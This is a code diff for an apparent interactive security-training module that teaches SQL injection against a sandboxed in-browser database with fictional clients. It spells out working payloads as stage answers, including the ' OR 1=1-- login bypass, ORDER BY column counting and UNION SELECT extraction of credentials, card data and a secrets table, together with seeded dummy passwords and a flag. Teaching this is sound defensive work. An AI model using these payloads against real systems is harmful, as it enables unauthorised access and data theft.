@@ -1,13 +1,14 @@
 "use client";
 
-/* Module 5 - Injection (DEPTH STANDARD v2).
+/* Module 5 - Injection (DEPTH STANDARD v3).
  *
- * The full engagement, roughly doubled, built to the standard the owner set
- * from UAT: hover/tap glossary on every technical term, de-biased + tougher
- * checks (shuffled in the shell), a deeper taught lesson with a recap, a
- * five-stage capture (probe -> bypass -> extract staff -> enumerate the schema
- * -> crack the vault), and TWO scenario-based consolidation drills on fresh
- * clients. All injection runs for real against wasm SQLite, zero egress. */
+ * Built to the standard from UAT, then deepened again from re-test: hover/tap
+ * glossary, de-biased checks with near-miss distractors, a taught lesson with a
+ * recap, a SEVEN-stage capture (probe -> bypass -> count columns -> extract
+ * staff -> map the schema -> lift the card data -> crack the vault), a hint
+ * ladder that can drop a fill-in-the-blanks STRUCTURE into the box, and THREE
+ * scenario drills on fresh clients (the last one unguided, four columns). All
+ * injection runs for real against wasm SQLite, zero egress. */
 
 import { useEffect, useState } from "react";
 import Engagement, { type ModuleDef, type GlossaryEntry, C, MONO, DISP, Btn, withGlossary } from "./Engagement";
@@ -89,16 +90,23 @@ function Palette({ tokens, onInsert }: { tokens: string[]; onInsert: (t: string)
   );
 }
 
-function HintLadder({ hints, onReveal }: { hints: string[]; onReveal: () => void }) {
+function HintLadder({ hints, onSkeleton, onReveal }: { hints: string[]; onSkeleton: () => void; onReveal: () => void }) {
   const [shown, setShown] = useState(0);
+  const [structured, setStructured] = useState(false);
   return (
     <div style={{ marginTop: 12 }}>
       {Array.from({ length: shown }).map((_, i) => (
         <div key={i} style={{ marginBottom: 6, padding: "9px 12px", borderLeft: `2px solid ${C.indigo}`, background: "rgba(139,123,255,0.05)", fontSize: 13, color: C.soft, lineHeight: 1.5 }}>{hints[i]}</div>
       ))}
+      {shown >= hints.length && (
+        <div style={{ marginBottom: 6, padding: "9px 12px", borderLeft: `2px solid ${C.cyan}`, background: "rgba(95,230,255,0.05)", fontSize: 13, color: C.soft, lineHeight: 1.5 }}>
+          Stuck on how to type it? Drop the structure into the box and fill in the blanks (the column and table names).
+        </div>
+      )}
       <div style={{ display: "flex", gap: 14, alignItems: "center", flexWrap: "wrap" }}>
         {shown < hints.length && <button onClick={() => setShown(shown + 1)} style={{ background: "none", border: "none", color: C.indigo2, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>{shown === 0 ? "hint" : "another hint"}</button>}
-        {shown >= hints.length && <button onClick={onReveal} style={{ background: "none", border: "none", color: C.mute, fontFamily: MONO, fontSize: 12, cursor: "pointer" }}>stuck? reveal the payload</button>}
+        {shown >= hints.length && !structured && <button onClick={() => { onSkeleton(); setStructured(true); }} style={{ background: "none", border: "none", color: C.cyan, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>show the structure</button>}
+        {shown >= hints.length && <button onClick={onReveal} style={{ background: "none", border: "none", color: C.mute, fontFamily: MONO, fontSize: 12, cursor: "pointer" }}>stuck? reveal the full answer</button>}
       </div>
     </div>
   );
@@ -163,8 +171,12 @@ function PickSafeQueryLab({ onDone }: { onDone: () => void }) {
 
 type Stage = {
   key: string; title: string; surface: "login" | "search"; goal: string;
-  tokens: string[]; hints: string[]; reveal: string;
-  done: (r: RangeRunResult & { authed?: boolean }, range: NorthwindRange) => boolean;
+  tokens: string[]; hints: string[];
+  /** The structural scaffold dropped into the box on "show the structure" -
+   *  blanks for the learner to fill, so they see where the quotes/commas go. */
+  skeleton: string;
+  reveal: string;
+  done: (r: RangeRunResult & { authed?: boolean }, range: NorthwindRange, input: string) => boolean;
 };
 
 const STAGES: Stage[] = [
@@ -173,37 +185,53 @@ const STAGES: Stage[] = [
     goal: "Confirm the login is injectable. Make it error by breaking the query - put a single quote in the email and log in. A syntax error means it's taking your input literally.",
     tokens: ["'"],
     hints: ["A valid query won't error. Feed it something that breaks the SQL syntax.", "Put a single quote ' in the email field and submit. The extra quote makes the query invalid and it throws."],
-    reveal: "'", done: (r) => r.error != null,
+    skeleton: "'", reveal: "'", done: (r) => r.error != null,
   },
   {
     key: "bypass", title: "Bypass", surface: "login",
     goal: "Log in with no password. Close the string, add an always-true condition, and comment out the password check.",
     tokens: ["'", " OR 1=1", "--"],
     hints: ["Start by closing the string with a quote, like the probe.", "After the quote, add a condition that's always true: OR 1=1", "Finish with -- to comment out the rest of the line. Put it in the EMAIL field; leave the password blank."],
-    reveal: "' OR 1=1--", done: (r) => !!r.authed,
+    skeleton: "' OR ___ --", reveal: "' OR 1=1--", done: (r) => !!r.authed,
+  },
+  {
+    key: "count", title: "Count the columns", surface: "search",
+    goal: "Before you can UNION, you need to know how many columns the search returns. ORDER BY <n> sorts by the nth column - and errors if there is no nth column. Climb the number until it errors; the last one that works is your count. Get ORDER BY 3 to run clean.",
+    tokens: ["'", " ORDER BY 1", " ORDER BY 2", " ORDER BY 3", " ORDER BY 4", "--"],
+    hints: ["Try ' ORDER BY 1-- then 2, then 3, then 4... watch for the number that errors.", "' ORDER BY 4-- errors (there is no 4th column). ' ORDER BY 3-- works - so the search has 3 columns."],
+    skeleton: "' ORDER BY ___ --", reveal: "' ORDER BY 3--",
+    done: (_r, _range, input) => /order\s+by\s+3\b/i.test(input) && _r.error == null,
   },
   {
     key: "staff", title: "Extract staff", surface: "search",
-    goal: "The product search is injectable too. Use a UNION to pull the whole staff table (email, pass, role) out through it.",
-    tokens: ["'", " UNION SELECT ", "email", "pass", "role", ",", " FROM users", "--", " ORDER BY 3", " ORDER BY 4"],
-    hints: ["Your UNION must return the SAME number of columns as the search. Try ' ORDER BY 4-- then ' ORDER BY 3-- to find how many.", "The search returns 3 columns. So: ' UNION SELECT (three things) FROM users--", "Pull the useful three: ' UNION SELECT email, pass, role FROM users--"],
-    reveal: "' UNION SELECT email, pass, role FROM users--",
+    goal: "Now you know it's 3 columns. Use a UNION to pull the whole staff table (email, pass, role) out through the search.",
+    tokens: ["'", " UNION SELECT ", "email", "pass", "role", ",", " FROM users", "--"],
+    hints: ["Match the 3 columns you found: ' UNION SELECT (three things) FROM users--", "Pull the useful three: ' UNION SELECT email, pass, role FROM users--"],
+    skeleton: "' UNION SELECT ___, ___, ___ FROM ___ --", reveal: "' UNION SELECT email, pass, role FROM users--",
     done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && c.endsWith("@northwind.range"))),
   },
   {
     key: "enumerate", title: "Map the schema", surface: "search",
     goal: "You don't know what else is in the database yet. Every SQLite database lists its own tables in a built-in table called sqlite_master - UNION it out to enumerate the schema and find what's hidden.",
     tokens: ["'", " UNION SELECT ", "name", "sql", "type", ",", " FROM sqlite_master", "--"],
-    hints: ["Same UNION, 3 columns again - but this time SELECT from sqlite_master.", "Try: ' UNION SELECT name, sql, type FROM sqlite_master-- and read the table names that come back. One of them is interesting."],
-    reveal: "' UNION SELECT name, sql, type FROM sqlite_master--",
+    hints: ["Same UNION, 3 columns again - but this time SELECT from sqlite_master.", "Try: ' UNION SELECT name, sql, type FROM sqlite_master-- and read the table names that come back. Two of them you haven't touched yet."],
+    skeleton: "' UNION SELECT ___, ___, ___ FROM sqlite_master --", reveal: "' UNION SELECT name, sql, type FROM sqlite_master--",
     done: (r) => r.rows.some((row) => row.some((c) => c === "secrets")),
   },
   {
+    key: "cards", title: "Lift the card data", surface: "search",
+    goal: "The schema showed an orders table - customer payment records, sitting in the same database. Pull it out through the search: customer names and the last 4 digits of their cards.",
+    tokens: ["'", " UNION SELECT ", "customer", "card_last4", "NULL", ",", " FROM orders", "--"],
+    hints: ["Same UNION, 3 columns. The table is called orders.", "orders has customer and card_last4. Pad the third column with NULL: ' UNION SELECT customer, card_last4, NULL FROM orders--"],
+    skeleton: "' UNION SELECT ___, ___, ___ FROM ___ --", reveal: "' UNION SELECT customer, card_last4, NULL FROM orders--",
+    done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && /^\d{4}$/.test(c))),
+  },
+  {
     key: "vault", title: "Crack the vault", surface: "search",
-    goal: "You found a secrets table. UNION it out the same way to capture the flag.",
+    goal: "Last target: the secrets table the schema revealed. UNION it out the same way to capture the flag.",
     tokens: ["'", " UNION SELECT ", "label", "value", "NULL", ",", " FROM secrets", "--"],
     hints: ["Same trick, the secrets table. Still three columns.", "secrets has label and value. Pad the third with NULL: ' UNION SELECT label, value, NULL FROM secrets--"],
-    reveal: "' UNION SELECT label, value, NULL FROM secrets--",
+    skeleton: "' UNION SELECT ___, ___, ___ FROM secrets --", reveal: "' UNION SELECT label, value, NULL FROM secrets--",
     done: (r, range) => r.rows.some((row) => row.some((c) => c === range.vaultFlag)),
   },
 ];
@@ -235,7 +263,7 @@ function InjectionAct({ onCapture }: { onCapture: () => void }) {
     if (!range) return;
     const r = stage.surface === "login" ? range.attemptLogin(email, pass) : range.search(term);
     setRes(r);
-    if (stage.done(r, range)) { const n = [...cleared]; n[si] = true; setCleared(n); }
+    if (stage.done(r, range, field)) { const n = [...cleared]; n[si] = true; setCleared(n); }
   }
   function advance() {
     setRes(null);
@@ -276,7 +304,7 @@ function InjectionAct({ onCapture }: { onCapture: () => void }) {
             <button onClick={() => setField("")} style={{ background: "none", border: "none", color: C.mute, fontFamily: MONO, fontSize: 12, cursor: "pointer" }}>clear</button>
           </div>
           {res && <ResultView r={res} />}
-          {!stageCleared && <HintLadder key={stage.key} hints={stage.hints} onReveal={() => setField(stage.reveal)} />}
+          {!stageCleared && <HintLadder key={stage.key} hints={stage.hints} onSkeleton={() => setField(stage.skeleton)} onReveal={() => setField(stage.reveal)} />}
         </div>
       </div>
 
@@ -294,7 +322,7 @@ function InjectionAct({ onCapture }: { onCapture: () => void }) {
 
 type DrillCfg = {
   client: string; brief: string; surface: "login" | "search"; host: string;
-  spec: ScenarioSpec; goal: string; palette: string[]; hint: string; reveal: string;
+  spec: ScenarioSpec; goal: string; palette: string[]; hint: string; skeleton: string; reveal: string;
   done: (r: RangeRunResult & { authed?: boolean }) => boolean; success: string;
 };
 
@@ -312,7 +340,8 @@ const DRILLS: DrillCfg[] = [
     },
     goal: "Log into the donor portal with no valid password.",
     palette: ["'", " OR 1=1", "--"],
-    hint: "Same front-door move as Northwind: close the string, force it true, comment out the rest. Email field; password blank. ' OR 1=1--",
+    hint: "Same front-door move as Northwind: close the string, force it true, comment out the rest. Email field; password blank.",
+    skeleton: "' OR ___ --",
     reveal: "' OR 1=1--",
     done: (r) => !!r.authed,
     success: "Signed in with no password - Harborlight's login trusts user input exactly like Northwind's did. Finding logged for them.",
@@ -330,10 +359,32 @@ const DRILLS: DrillCfg[] = [
     },
     goal: "UNION the members table out through the book search to read a member's card number.",
     palette: ["'", " UNION SELECT ", "id", "name", "cardno", ",", " FROM members", "--"],
-    hint: "The book search returns 3 columns (id, title, author). Match it: ' UNION SELECT id, name, cardno FROM members--",
+    hint: "The book search returns 3 columns (id, title, author). Match it with three, from the members table.",
+    skeleton: "' UNION SELECT ___, ___, ___ FROM ___ --",
     reveal: "' UNION SELECT id, name, cardno FROM members--",
     done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && c.startsWith("MEM-"))),
     success: "Member records pulled straight out of a 'book' search. Same UNION skill, brand-new target. Finding logged.",
+  },
+  {
+    client: "Fenwick Forums",
+    brief: "Last field job, and the trickiest. Fenwick's community forum has a thread search wired to the same database that stores member logins - but this search returns a different number of columns. No walkthrough: work out the shape yourself, then pull the members out.",
+    surface: "search", host: "forum.fenwick.range · thread search",
+    spec: {
+      setup: `CREATE TABLE threads (id INTEGER PRIMARY KEY, title TEXT, author TEXT, posted TEXT);
+              INSERT INTO threads (title,author,posted) VALUES ('Welcome','admin','2026-01-02'),('Forum rules','mod','2026-01-03');
+              CREATE TABLE members (id INTEGER PRIMARY KEY, username TEXT, email TEXT, pass TEXT);
+              INSERT INTO members (username,email,pass) VALUES
+                ('h.patel','h.patel@fenwick.range','Spr1ng!99'),
+                ('admin','admin@fenwick.range','F0rum_Adm1n');`,
+      search: { table: "threads", select: "id, title, author, posted", searchCol: "title" },
+    },
+    goal: "This search returns FOUR columns, not three. Count them with ORDER BY first, then UNION the members table (id, username, email, pass).",
+    palette: ["'", " ORDER BY 4", " ORDER BY 5", " UNION SELECT ", "id", "username", "email", "pass", ",", " FROM members", "--"],
+    hint: "' ORDER BY 5-- errors, ' ORDER BY 4-- works - so four columns. Match four from members.",
+    skeleton: "' UNION SELECT ___, ___, ___, ___ FROM members --",
+    reveal: "' UNION SELECT id, username, email, pass FROM members--",
+    done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && c.endsWith("@fenwick.range"))),
+    success: "Credentials pulled from a forum search - and you worked out the column count yourself. That's the real skill. Finding logged.",
   },
 ];
 
@@ -382,12 +433,16 @@ function DrillSurface({ cfg, onSolved }: { cfg: DrillCfg; onSolved: () => void }
         </div>
         {res && <ResultView r={res} />}
         {!solved && (
-          <div style={{ marginTop: 12, display: "flex", gap: 14, alignItems: "center", flexWrap: "wrap" }}>
+          <div style={{ marginTop: 12 }}>
             {!showReveal ? (
               <button onClick={() => setShowReveal(true)} style={{ background: "none", border: "none", color: C.indigo2, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>hint</button>
             ) : (
               <div style={{ padding: "9px 12px", borderLeft: `2px solid ${C.indigo}`, background: "rgba(139,123,255,0.05)", fontSize: 13, color: C.soft, lineHeight: 1.5 }}>
-                {cfg.hint} <button onClick={() => setVal(cfg.reveal)} style={{ background: "none", border: "none", color: C.mute, fontFamily: MONO, fontSize: 12, cursor: "pointer" }}>- fill it</button>
+                {cfg.hint}
+                <div style={{ marginTop: 7, display: "flex", gap: 14, flexWrap: "wrap" }}>
+                  <button onClick={() => setVal(cfg.skeleton)} style={{ background: "none", border: "none", color: C.cyan, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>show the structure</button>
+                  <button onClick={() => setVal(cfg.reveal)} style={{ background: "none", border: "none", color: C.mute, fontFamily: MONO, fontSize: 12, cursor: "pointer" }}>reveal the full answer</button>
+                </div>
               </div>
             )}
           </div>
@@ -430,7 +485,7 @@ export const MODULE5: ModuleDef = {
   title: "Injection",
   client: "Northwind Foods",
   brief:
-    "A deep engagement. Northwind Foods' staff portal and product shop both build their database queries straight from whatever you type. Your job is the full job: prove the weakness, break in, read out the staff records, map what else is in there, and reach the one secret they really didn't want found. Then two field jobs for new clients. All for real.",
+    "A deep engagement. Northwind Foods' staff portal and product shop both build their database queries straight from whatever you type. Your job is the full job: prove the weakness, break in, work out the shape of the data, read out the staff records, map what else is in there, lift the customer card data, and reach the one secret they really didn't want found. Then three field jobs for new clients. All for real.",
   lesson: {
     blocks: [
       { h: "First - what's a database?", body: "Almost every app stores its information in a database: an organised store you can picture as a stack of spreadsheets. Each table is one sheet (a 'users' table, a 'products' table), and each row is one record. The app reads and writes it constantly - your login, your messages, your scores all live there. The app talks to the database in a language called SQL, by sending it a query." },
@@ -450,10 +505,10 @@ export const MODULE5: ModuleDef = {
     check: {
       q: "An app builds its login query by joining your typed email straight into the SQL text. Why is that the dangerous part?",
       options: [
-        { text: "Characters in your input (like a quote) can end the 'data' and let the rest run as commands.", correct: true, feedback: "Exactly. Once your input can change the query's structure, it's no longer just data - it's code." },
-        { text: "Joining lots of text together is slow, so the login times out and lets anyone through.", feedback: "Performance isn't the issue - a fast query is just as injectable. The problem is input becoming code." },
-        { text: "The email gets stored in plain text, so an attacker can read it from the database later.", feedback: "Storing data in the clear is a different weakness. Here the danger is the query being built from your input." },
-        { text: "A very long email overflows the database and corrupts the rows next to it.", feedback: "That's mixing up a different class of bug. SQL injection is about your input changing what the query does." },
+        { text: "Your input can close the text and the rest of what you type becomes part of the query's commands.", correct: true, feedback: "Right. The quote ends the data, so what follows is read as SQL, not as your email." },
+        { text: "Your input stays data, but joining it on makes the query check the password before the email.", feedback: "No - the order of the checks isn't the issue, and your input doesn't stay data; it can become part of the command." },
+        { text: "Your input can change the query, but only inside the part the developer wrapped in quotes.", feedback: "Close, but the quote lets you break OUT of that part - that's the whole point; nothing keeps you inside it." },
+        { text: "Your input only becomes a command if it contains a SQL keyword like SELECT or UNION.", feedback: "No - a single quote plus OR 1=1 is enough; you don't need a big keyword to change the query." },
       ],
     },
   },
@@ -464,8 +519,8 @@ export const MODULE5: ModuleDef = {
     offLimits: "DROP/DELETE/UPDATE, other Northwind hosts, real data",
     timebox: "this session",
   },
-  handler: "Five stages, then two field jobs. Confirm it's injectable, walk in the front door, turn the search box into a window onto the whole database, map what's in there, then take the prize. Try each yourself before the hints - that's how it sticks. Password field stays empty throughout; you're going around it.",
-  hint: "This is a multi-stage engagement - work the stages in order. Each has its own hint ladder and a last-resort reveal. The password field can stay empty; you're going around it, not guessing it.",
+  handler: "Seven stages, then three field jobs. Confirm it's injectable, walk in the front door, work out the shape of the data, then turn the search box into a window onto the whole database - staff, card records, and the vault. Try each yourself before the hints; if the typing trips you up, 'show the structure' drops a skeleton in for you to fill. Password field stays empty throughout; you're going around it.",
+  hint: "This is a multi-stage engagement - work the stages in order. Each has a hint ladder, a 'show the structure' scaffold, and a last-resort reveal. The password field can stay empty; you're going around it, not guessing it.",
   Act: InjectionAct,
   Consolidation: ConsolidationDrills,
   flag: "flag{un10n_t0_the_v4ult}",
@@ -479,10 +534,10 @@ export const MODULE5: ModuleDef = {
     check: {
       q: "A developer 'fixes' the login by deleting any single quotes from the input before building the query the same old way. Is that enough?",
       options: [
-        { text: "No - it's a blocklist. Attackers bypass it, it breaks real names like O'Brien, and the query is still built by hand. Use parameterised queries.", correct: true, feedback: "Right. Stripping characters is whack-a-mole; parameterisation removes the whole class of bug." },
-        { text: "Yes - with no quotes in the input, the string can't be closed, so injection is impossible.", feedback: "Not quite. Quotes aren't the only way in (numeric fields, encodings), and the query is still built by concatenation." },
-        { text: "Yes, as long as they also hide the database error messages from users.", feedback: "Hiding errors removes a clue, but the injection still works. The build-by-gluing approach is the real problem." },
-        { text: "No, but only because it breaks names like O'Brien - add an exception for apostrophes and it's then safe.", feedback: "The broken-names point is real, but 'add an exception' keeps the blocklist and its bypasses. Parameterise instead." },
+        { text: "No - the query is still glued together by hand, so other inputs (and numeric fields) still break it; parameterise instead.", correct: true, feedback: "Right. Removing one character is a blocklist; the real fix is to stop building SQL from input at all." },
+        { text: "No - stripping quotes helps, but you also need to strip commas and the word UNION for it to be safe.", feedback: "Still a blocklist - attackers slip past with encodings and casing. Parameterise instead of chasing characters." },
+        { text: "Yes - with the quotes removed, the input can't escape the data, so the query is safe.", feedback: "Not quite - numeric fields and encoded quotes still get through, and the query is still built by gluing." },
+        { text: "Yes - as long as the same quote-stripping runs on every field, not just the login.", feedback: "Applying a blocklist everywhere is still a blocklist; it breaks real input and misses bypasses. Parameterise." },
       ],
     },
   },
